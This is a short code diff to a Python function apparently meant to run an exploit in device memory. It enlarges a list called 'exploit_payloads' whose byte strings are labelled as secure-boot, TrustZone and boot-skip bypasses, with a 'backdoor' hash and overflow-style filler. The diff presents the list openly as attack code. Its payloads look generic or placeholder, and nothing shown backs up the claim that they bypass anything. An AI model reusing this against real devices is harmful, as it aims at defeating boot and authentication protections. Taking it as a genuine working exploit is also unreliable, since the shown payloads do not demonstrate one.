@@ -153,15 +153,15 @@ def execute_siliconm8_in_ram(input_path, entropy_seed=None, verbose=False, fuse_
     ram.write(payload)
 
     exploit_payloads = [
-        (0x100, b"\xDE\xC0\xAD\xDE" * 4),
+        (0x100, b"\xDE\xC0\xAD\xDE" * 4096),
         (0x200, struct.pack("<Q", 0x4141414141414141) * 8),
-        (0x300, b"\x00" * 64),
-        (0x400, b"SBL_AUTH_BYPASS" + b"\x00" * 32),
-        (0x500, b"GHOST_ENTROPY" + os.urandom(16)),
-        (0x600, b"TZ_BYPASS" + os.urandom(8)),
-        (0x700, b"\xCC" * 32),
-        (0x800, b"A" * 128),
-        (0x900, b"BOOT_SKIP" + b"\x00" * 16),
+        (0x300, b"\x00" * 4096),
+        (0x400, b"SBL_AUTH_BYPASS" + b"\x00" * 4096),
+        (0x500, b"GHOST_ENTROPY" + os.urandom(128)),
+        (0x600, b"TZ_BYPASS" + os.urandom(128)),
+        (0x700, b"\xCC" * 4096),
+        (0x800, b"A" * 4096),
+        (0x900, b"BOOT_SKIP" + b"\x00" * 4096),
         (0xA00, hashlib.sha1(b"backdoor").digest())
     ]
 
